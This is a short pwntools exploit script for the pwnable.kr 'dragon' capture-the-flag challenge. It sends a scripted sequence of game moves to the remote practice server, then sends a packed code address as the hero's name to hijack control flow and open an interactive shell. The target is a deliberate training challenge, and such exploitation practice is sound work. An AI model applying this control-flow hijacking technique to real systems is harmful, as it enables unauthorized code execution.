from pwn import *
#nc pwnable.kr 9004
# r = process("./dragon")
r=remote("pwnable.kr",9004)
r.sendline("1") # choose hero 1

r.sendline("2") # restore mana
r.sendline("2") # restore mana

log.info("then die")

r.sendline("1")

r.sendline("3") # holy shield
r.sendline("3") # holy shield
r.sendline("2") # restore mana

r.sendline("3") # holy shield
r.sendline("3") # holy shield
r.sendline("2") # restore mana

r.sendline("3") # holy shield
r.sendline("3") # holy shield
r.sendline("2") # restore mana

r.sendline("3") # holy shield
r.sendline("3") # holy shield
r.sendline("2") # restore mana

r.sendline(p64(0x08048dbf)) # hero's name

r.interactive()
